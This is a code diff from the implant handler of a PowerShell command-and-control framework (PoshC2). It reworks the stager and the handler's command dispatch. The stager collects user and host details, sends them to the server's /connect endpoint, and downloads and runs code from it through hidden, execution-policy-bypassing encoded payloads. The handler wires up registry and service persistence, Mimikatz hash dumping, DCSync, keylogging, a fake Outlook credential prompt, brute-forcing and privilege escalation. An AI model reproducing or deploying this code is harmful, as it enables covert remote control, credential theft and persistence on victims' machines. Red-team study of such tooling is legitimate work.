@@ -217,23 +217,37 @@ function Implant-Handler
     # run startup function
     startup
     # call back command
-    $command = 'function Get-Webclient ($Cookie) {
-$wc = New-Object System.Net.WebClient; 
-$wc.UseDefaultCredentials = $true; 
-$wc.Proxy.Credentials = $wc.Credentials;
-if ($cookie) {
-$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
-} $wc }
-function primer {
-$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
-$p64 = [Convert]::ToBase64String($pre)
-$pm = (Get-Webclient -Cookie $p64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
-$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
-$pm } 
-$pm = primer
-if ($pm) {$pm| iex} else {
-start-sleep 10
-primer | iex }'
+    $command = '
+    function Get-Webclient 
+    {
+    Param
+    (
+    [string]
+    $Cookie
+    )
+    $wc = New-Object System.Net.WebClient; 
+    $wc.UseDefaultCredentials = $true; 
+    $wc.Proxy.Credentials = $wc.Credentials;
+    if ($cookie) {
+    $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
+    }
+    $wc
+    }
+    function primer
+    {
+    $whoami = (whoami) -replace "`r|`n"
+    $pretext = [System.Text.Encoding]::Unicode.GetBytes("$whoami;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
+    $pretext64 = [Convert]::ToBase64String($pretext)
+    $primer = (Get-Webclient -Cookie $pretext64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
+    $primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
+    $primer
+    } 
+    $primer = primer
+    if ($primer) {$primer| iex} else {
+    start-sleep 10
+    primer | iex
+    }
+    '
 
     function Get-RandomURI 
     {
@@ -252,7 +266,7 @@ primer | iex }'
     # create payloads
     function CreatePayload 
     {
-        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+        $bytes = [Text.Encoding]::Unicode.GetBytes($command)
         $payloadraw = 'powershell -exec bypass -windowstyle hidden -Noninteractive -e '+[Convert]::ToBase64String($bytes)
         $payload = $payloadraw -replace "`n", ""
         [IO.File]::WriteAllLines("$FolderPath\payload.bat", $payload)
@@ -263,7 +277,7 @@ primer | iex }'
     # create macropayloads
     function CreateMacroPayload 
     {
-        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+        $bytes = [Text.Encoding]::Unicode.GetBytes($command)
         $payloadraw = [Convert]::ToBase64String($bytes)
         $payload = $payloadraw -replace "`n", ""
         $payloadbits = $null
@@ -339,11 +353,8 @@ primer | iex }'
     {
         param
         (
-            [Object]
             $username,
-            [Object]
             $password,
-            [Object]
             $proxyurl
         )
         $command = '
@@ -380,7 +391,8 @@ primer | iex }'
             } 
             function primer
             {
-            $pretext = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
+            $whoami = (whoami) -replace "`r|`n"
+            $pretext = [System.Text.Encoding]::Unicode.GetBytes("$whoami;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
             $pretext64 = [Convert]::ToBase64String($pretext)
             $primer = (Get-Webclient -Cookie $pretext64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
             $primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
@@ -392,8 +404,8 @@ primer | iex }'
             primer | iex
             }
         '
-        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-        $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+        $bytes = [Text.Encoding]::Unicode.GetBytes($command)
+        $payloadraw = 'powershell -exec bypass -windowstyle hidden -Noninteractive -e '+[Convert]::ToBase64String($bytes)
         $payload = $payloadraw -replace "`n", ""
         [IO.File]::WriteAllLines("$FolderPath\proxypayload.bat", $payload)
         [IO.File]::WriteAllLines("C:\Temp\PowershellC2\Modules\proxypayload.ps1", "`$proxypayload = '$payload'")
@@ -424,7 +436,7 @@ function Upload-File
     $bufferSize = 90000
     $buffer = New-Object byte[] $bufferSize
      
-    $reader = [System.IO.File]::OpenRead($Source)
+    $reader = [IO.File]::OpenRead($Source)
     $base64 = $null
      
     $bytesRead = 0
@@ -512,62 +524,33 @@ param
 [string] $pscommand,
 [string] $psrandomuri
 )
-# alias list
-            if ($pscommand)
-            { 
-                CheckModuleLoaded "Implant-Core.ps1" $psrandomuri
-            }
-            if ($pscommand -eq 'Get-ExternalIP') 
-            {
-                $pscommand = '(get-webclient).downloadstring("http://ipecho.net/plain")'
-            }  
-            if ($pscommand -eq 'getuid') 
-            {
-                $pscommand = 'fvdsghfdsyyh'
-                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
-                Write-Host $dbresult
-            }  
-            if ($pscommand -eq 'ps') 
-            {
-                $pscommand = 'get-processfull'
-            }
-            if ($pscommand -eq 'id') 
-            {
-                $pscommand = 'fvdsghfdsyyh'
-                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
-                Write-Host $dbresult
-            }
-            if ($pscommand -eq 'whoami') 
-            {
-                $pscommand = 'fvdsghfdsyyh'
-                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
-                Write-Host $dbresult
-            }
-            if ($pscommand -eq 'Kill-Implant') 
-            {
-                $pscommand = 'exit'
-                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$psrandomuri'"|Out-Null
-            }
-            if ($pscommand -eq 'Show-ServerInfo') 
-            {
+
+    Switch ($pscommand)
+        {
+        Get-ExternalIP {$pscommand = '(get-webclient).downloadstring("http://ipecho.net/plain")'}
+        getuid {$pscommand = "$env:windir\system32\whoami.exe"}
+        ps {$pscommand = 'Get-Process'}
+        id {$pscommand = "$env:windir\system32\whoami.exe"}
+        kill-implant {
+            $pscommand = 'exit'
+            Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$psrandomuri'"
+            Out-Null}
+        show-serverinfo {
                 $pscommand = 'fvdsghfdsyyh'
                 $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
                 Write-Host $dbresult
             }
-            if ($pscommand -eq 'get-pid') 
-            {
+        get-pid {
                 $pscommand = 'fvdsghfdsyyh'
                 $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT PID FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                 Write-Host $dbresult
             }
-            if ($pscommand -eq 'Get-ImplantWorkingDirectory') 
-            {
+        Get-ImplantWorkingDirectory {
                 $pscommand = 'fvdsghfdsyyh'
                 $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT FolderPath FROM C2Server" -As SingleValue
                 Write-Host $dbresult
             }
-            if ($pscommand -eq 'ListModules') 
-            {
+        listmodules {
                 $pscommand = 'fvdsghfdsyyh'
                 Write-Host -Object ""
                 $listmodules = Get-ChildItem -Path "C:\temp\PowershellC2\Modules" -Name
@@ -577,58 +560,55 @@ param
                 }
                 
                 Write-Host -Object ""
-            }  
-            if ($pscommand -eq 'ModulesLoaded') 
-            {
+            }
+        modulesloaded {
                 $pscommand = 'fvdsghfdsyyh'
                 $mods = Invoke-SqliteQuery -DataSource $Database -Query "SELECT ModsLoaded FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                 Write-Host $mods
             }
-            if ($pscommand -eq 'Remove-ServiceLevel-Persistence') 
-            {
-                $pscommand = "sc.exe delete CPUpdater"       
-            }
-            if ($pscommand -eq 'Install-ServiceLevel-Persistence') 
-            {
+        remove-servicelevel-persistence {$pscommand = "sc.exe delete CPUpdater"}
+
+        install-servicelevel-persistence {
                 $payload = Get-Content -Path "$FolderPath\payload.bat"
                 $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
-            }
-            if ($pscommand -eq 'Install-ServiceLevel-PersistenceWithProxy') 
-            {
+                }                   
+                
+        install-servicelevel-persistencewithproxy {
                 if (Test-Path "$FolderPath\proxypayload.bat"){
                     $payload = Get-Content -Path "$FolderPath\proxypayload.bat"
                     $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
-                } else {
-                    write-host "Need to run CreateProxyPayload first"
-                    $pscommand = 'fvdsghfdsyyh'
+                    } 
+                        else {
+                        Write-Warning -Message 'Need to run CreateProxyPayload first'
+                        $pscommand = 'fvdsghfdsyyh'
+                        }
                 }
-            }
-            if ($pscommand.ToLower().StartsWith('invoke-wmiproxypayload'))
-            {
+        invoke-wmiproxypayload {
                 if (Test-Path "$FolderPath\proxypayload.bat"){ 
                     CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
                     $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"
                     $pscommand = $pscommand -replace 'Invoke-WMIProxyPayload', 'Invoke-WMICommand'
                     $pscommand = $pscommand + " -command '$proxypayload'"
-                } else {
-                    write-host "Need to run CreateProxyPayload first"
-                    $pscommand = 'fvdsghfdsyyh'
+                    }
+                        else {
+                        Write-Warning -Message 'Need to run CreateProxyPayload first'
+                        $pscommand = 'fvdsghfdsyyh'
+                        }
                 }
-            }
-            if ($pscommand.ToLower().StartsWith('invoke-wmipayload'))
-            {
+        invoke-wmipayload {
                 if (Test-Path "$FolderPath\payload.bat"){ 
                     CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
                     $payload = Get-Content -Path "$FolderPath\payload.bat"
                     $pscommand = $pscommand -replace 'Invoke-WMIPayload', 'Invoke-WMICommand'
                     $pscommand = $pscommand + " -command '$payload'"
-                } else {
-                    write-host "Can't find the payload.bat file, run CreatePayload first"
-                    $pscommand = 'fvdsghfdsyyh'
+                    }
+                        else {
+                        Write-Warning -Message 'Need to run CreatePayload first'
+                        $pscommand = 'fvdsghfdsyyh'
+                        }
                 }
-            }
-            if ($pscommand -eq "Install-Persistence"){
-$pscommand = '
+        install-persistence {
+                $pscommand = '
 Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777 -value "$payload"
 Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate -value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper777"
 $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
@@ -639,8 +619,7 @@ Write-Output "Successfully installed persistence: `n Regkey: HKCU\Software\Micro
 Write-Output "Error installing persistence"
 }'
             }
-
-            if ($pscommand -eq "Remove-Persistence"){
+        remove-persistence {
 $pscommand = '
 Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
 Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
@@ -654,145 +633,108 @@ Write-Output "Error removing persistence, remove registry keys manually!"
 $error.clear()
 }'            
             }
-            if ($pscommand.ToLower().StartsWith('hashdump'))
-            { 
+        hashdump { 
                 CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
                 $pscommand = "Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::sam$($speechmarks)$($tick)"
             }
-            if ($pscommand.ToLower().StartsWith('invoke-sqlquery'))
-            { 
+        invoke-sqlquery { 
                 CheckModuleLoaded "Invoke-SqlQuery.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-psinject'))
-            { 
+        invoke-psinject { 
                 CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-psinject-payload'))
-            { 
+        invoke-psinject-payload { 
                 CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
                 CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                 $psargs = $pscommand -replace 'invoke-psinject-payload',''
                 $pscommand = "invoke-psinject -payloadtype normal $($psargs)"
             }
-            if ($pscommand.ToLower().StartsWith('invoke-psinject-proxypayload'))
-            { 
-                if (Test-Path "$FolderPath\proxypayload.bat"){ 
+        invoke-psinject-proxypayload { 
                 CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
-                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                 $psargs = $pscommand -replace 'invoke-psinject-proxypayload',''
                 $pscommand = "invoke-psinject -payloadtype proxy $($psargs)"
-                } else {
-                write-host "Need to run CreateProxyPayload first"
-                $pscommand = 'fvdsghfdsyyh'
-                }
             }
-            if ($pscommand.ToLower().StartsWith('test-adcredential'))
-            { 
+        test-adcrenditial{ 
                 CheckModuleLoaded "test-adcredential.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-allchecks'))
-            { 
+        invoke-allchecks { 
                 CheckModuleLoaded "Powerup.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-hostscan'))
-            { 
+        invoke-hostscan { 
                 CheckModuleLoaded "Invoke-Hostscan.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('get-recentfiles'))
-            { 
+        get-recentfiles { 
                 CheckModuleLoaded "Get-RecentFiles.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-tokenmanipulation'))
-            { 
+        invoke-tokenmanipulation { 
                 CheckModuleLoaded "Invoke-TokenManipulation.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-inveigh'))
-            { 
+        invoke-inveigh { 
                 CheckModuleLoaded "Inveigh.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('get-net'))
-            { 
+        get-net { 
                 CheckModuleLoaded "PowerView.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-mimikatz'))
-            { 
+        invoke-mimikatz { 
                 CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-userhunter'))
-            { 
+        invoke-userhunter { 
                 CheckModuleLoaded "PowerView.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-sharefinder'))
-            { 
+        invoke-sharefinder { 
                 CheckModuleLoaded "invoke-sharefinder.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-dcsync'))
-            { 
+        invoke-dcsync { 
                 CheckModuleLoaded "Invoke-DCSync.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('get-keystrokes'))
-            { 
+        get-keystrokes { 
                 CheckModuleLoaded "Get-Keystrokes.ps1" $psrandomuri    
             }
-            if ($pscommand.ToLower().StartsWith('invoke-portscan'))
-            { 
+        invoke-portscan { 
                 CheckModuleLoaded "Invoke-Portscan.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('get-mshotfix'))
-            { 
+        get-mshotfix { 
                 CheckModuleLoaded "Get-MSHotfix.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('get-gpppassword'))
-            { 
+        get-gpppassword { 
                 CheckModuleLoaded "Get-GPPPassword.ps1" $psrandomuri
             }
-            if ($pscommand.tolower().startswith('invoke-wmicommand'))
-            {
+        invoke-wmicommand {
                 CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
             }
-            if ($pscommand.tolower().startswith('brute-ad'))
-            {
+        brute-ad {
                 CheckModuleLoaded "brute-ad.ps1" $psrandomuri
             }
-            if ($pscommand.tolower().startswith('brute-locadmin'))
-            {
+        brute-locadmin {
                 CheckModuleLoaded "brute-locadmin.ps1" $psrandomuri
             }
-            if ($pscommand.tolower().startswith('get-passpol'))
-            {
+        get-passpol {
                 CheckModuleLoaded "get-passpol.ps1" $psrandomuri
             }
-            if ($pscommand.tolower().startswith('get-locadm'))
-            {
+        get-locadm {
                 CheckModuleLoaded "get-locadm.ps1" $psrandomuri
             }
-            if ($pscommand.tolower().startswith('invoke-runas'))
-            {
+        invoke-runas {
                 CheckModuleLoaded "invoke-runas.ps1" $psrandomuri
             }
-            if ($pscommand.tolower().startswith('invoke-shellcode'))
-            {
+        invoke-shellcode {
                 CheckModuleLoaded "invoke-shellcode.ps1" $psrandomuri
             }
-            if ($pscommand.tolower().startswith('get-pass-notexp'))
-            {
+        get-pass-notexp {
                 CheckModuleLoaded "get-pass-notexp.ps1" $psrandomuri
             }
-            if ($pscommand.tolower().startswith('invoke-winrmsession'))
-            {
+        invoke-winrmsession {
                 CheckModuleLoaded "Invoke-WinRMSession.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-runaspayload'))
-            { 
+        invoke-runaspayload { 
                 CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                 CheckModuleLoaded "invoke-runaspayload.ps1" $psrandomuri
                 $pscommand = $pscommand -replace 'invoke-runaspayload', ''
                 $pscommand = "invoke-runaspayload $($pscommand)"
                 
-            }     
-            if ($pscommand.ToLower().StartsWith('invoke-runasproxypayload'))
-            { 
+            }
+        invoke-runasproxypayload { 
             if (Test-Path "$FolderPath\proxypayload.bat"){ 
                 $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"     
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
@@ -806,84 +748,61 @@ $error.clear()
                 $pscommand = $pscommand -replace 'invoke-runasproxypayload', ''
                 $pscommand = "invoke-runasproxypayload $($pscommand)"
                 } else {
-                write-host "Need to run CreateProxyPayload first"
+                Write-Warning -Message "Need to run CreateProxyPayload first"
                 $pscommand = 'fvdsghfdsyyh'
                 }
-            }         
-            if ($pscommand -eq 'StartAnotherImplantWithProxy') 
-            {
+            }
+        StartAnotherImplantWithProxy {
                 if (Test-Path "$FolderPath\proxypayload.bat"){ 
                 CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                 $pscommand = 'start-process -windowstyle hidden cmd -args "/c $proxypayload"'
                 } else {
-                write-host "Need to run CreateProxyPayload first"
+                Write-Warning -Message "Need to run CreateProxyPayload first"
                 $pscommand = 'fvdsghfdsyyh'
                 }
             }
-            if ($pscommand -eq 'StartAnotherImplant') 
-            {
+        start-anotherimplant {
                 $pscommand = 'start-process -windowstyle hidden cmd -args "/c $payload"'
             }
-            if ($pscommand.ToLower().StartsWith('get-proxy')) 
-            {
+        get-proxy {
                 $pscommand = 'Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"'
             }
-            if ($pscommand.ToLower().StartsWith('createmacropayload')) 
-            {
+        createmacropayload {
                 $pscommand|Invoke-Expression
                 $pscommand = 'fvdsghfdsyyh'
             }
-            if ($pscommand.ToLower().StartsWith('createproxypayload')) 
-            {
+        createproxypayload {
                 $pscommand|Invoke-Expression
                 $pscommand = 'fvdsghfdsyyh'
             }
-            if ($pscommand.ToLower().StartsWith('upload-file')) 
-            {
+        upload-file {
                 $output = Invoke-Expression $pscommand
                 $pscommand = $output
             }
-            if ($pscommand.ToLower().StartsWith('createpayload')) 
-            {
+        createpayload {
                 $pscommand|Invoke-Expression
                 $pscommand = 'fvdsghfdsyyh'
             }
-            if ($pscommand -eq 'cred-popper') 
-            {
+        cred-popper {
                 $pscommand = '$test = $Host.ui.PromptForCredential("Outlook requires your credentials","Please enter your active directory logon details:","$env:userdomain\$env:username",""); $test.GetNetworkCredential().username; $test.GetNetworkCredential().password; '
-                write-host "This will stall the implant until the user either enter's their credentials or cancel's the popup window"
+                write-warning -Message "This will stall the implant until the user either enter's their credentials or cancel's the popup window"
             }
-            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon'))) 
-            {
-                $sleeptime = $pscommand -replace 'sleep ', ''
-                $sleeptime = $pscommand -replace 'beacon ', ''
-                $pscommand = '$sleeptime = '+$sleeptime
-                $query = "UPDATE Implants SET Sleep=@Sleep WHERE RandomURI=@RandomURI"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    Sleep = $sleeptime
-                    RandomURI = $psrandomuri
-                } | Out-Null
-            }
-            if ($pscommand -eq 'invoke-ms16-032')
-            { 
+        invoke-ms16-032 { 
                 CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                 $pscommand = "LoadModule invoke-ms16-032.ps1"
             }
-            if ($pscommand -eq 'invoke-ms16-032-proxypayload')
-            { 
+        invoke-ms16-032-proxypayload { 
                 if (Test-Path "$FolderPath\proxypayload.bat"){ 
                 CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                 $pscommand = "LoadModule invoke-ms16-032-proxy.ps1"
                 } else {
-                write-host "Need to run CreateProxyPayload first"
+                Write-Warning -Message "Need to run CreateProxyPayload first"
                 $pscommand = 'fvdsghfdsyyh'
                 }
             }
-            # write-host " Get-System | Get-System-WithProxy" -ForegroundColor Green 
-            if ($pscommand -eq 'Get-System') 
-            {
+        get-system {
                 $payload = Get-Content -Path "$FolderPath\payload.bat"
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
                 VALUES (@RandomURI, @Command)"
@@ -903,8 +822,7 @@ $error.clear()
                 $pscommand = "sc.exe delete CPUpdater"
 
             }
-            if ($pscommand -eq 'Get-System-WithProxy') 
-            {
+        get-system-withproxy {
                 if (Test-Path "$FolderPath\proxypayload.bat"){
                     $payload = Get-Content -Path "$FolderPath\proxypayload.bat"
 
@@ -925,22 +843,21 @@ $error.clear()
                     } | Out-Null
                     $pscommand = "sc.exe delete CPUpdater"
                 } else {
-                    write-host "Need to run CreateProxyPayload first"
+                    Write-Warning -Message "Need to run CreateProxyPayload first"
                     $pscommand = 'fvdsghfdsyyh'
                 }
-            }                   
-            if ($pscommand -eq 'Hide-Implant') 
-            {
+            }
+        hide-implant {
                 $pscommand = "Hide"
             }
-            if ($pscommand -eq 'Unhide-Implant' ) {
+        unhide-implant {
                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='Yes' WHERE RandomURI='$psrandomuri'" | Out-Null
             }
-            if ($pscommand -eq 'output-to-html' ) {
+        output-to-html {
                $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants" -As PSObject
                $ImplantsArray = @()
                foreach ($implantres in $allresults) {                  
-                    $ImplantLog = New-Object PSObject | Select ImplantID, RandomURI, User, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep
+                    $ImplantLog = New-Object PSObject | Select-Object ImplantID, RandomURI, User, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep
 		            $ImplantLog.ImplantID = $implantres.ImplantID;
 		            $ImplantLog.RandomURI = $implantres.RandomURI;
 		            $ImplantLog.User = $implantres.User;
@@ -961,7 +878,7 @@ $error.clear()
                $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks" -As PSObject
                $TasksArray = @()
                foreach ($task in $allresults) {                  
-                    $ImplantTask = New-Object PSObject | Select TaskID, Timestamp, RandomURI, Command, Output
+                    $ImplantTask = New-Object PSObject | Select-Object TaskID, Timestamp, RandomURI, Command, Output
 		            $ImplantTask.TaskID = $task.CompletedTaskID;
                     $ImplantTask.Timestamp = $task.TaskID;
 		            $ImplantTask.RandomURI = $task.RandomURI;
@@ -971,7 +888,22 @@ $error.clear()
                }
                $TasksArray | ConvertTo-Html -title "<title>Tasks from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\ImplantTasks.html"
                $pscommand = 'fvdsghfdsyyh'
+            } 
+
             }
+
+            if (($pscommand.ToLower().StartsWith('sleep')) -or ($pscommand.ToLower().StartsWith('beacon'))) 
+            {
+                $sleeptime = $pscommand -replace 'sleep ', ''
+                $sleeptime = $pscommand -replace 'beacon ', ''
+                $pscommand = '$sleeptime = '+$sleeptime
+                $query = "UPDATE Implants SET Sleep=@Sleep WHERE RandomURI=@RandomURI"
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    Sleep = $sleeptime
+                    RandomURI = $psrandomuri
+                } | Out-Null
+            }
+
             $pscommand
 }
 # command process loop
@@ -1023,7 +955,7 @@ while($true)
             } 
             else 
             {
-                $global:implantid.split(",")| foreach {
+                $global:implantid.split(",")| ForEach-Object {
                     $global:randomuri = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE ImplantID='$_'" -as SingleValue
                     $outputcmd = runcommand $global:command $global:randomuri
                     if (($global:command -eq 'exit' ) -or ($outputcmd -eq 'hide' )) 
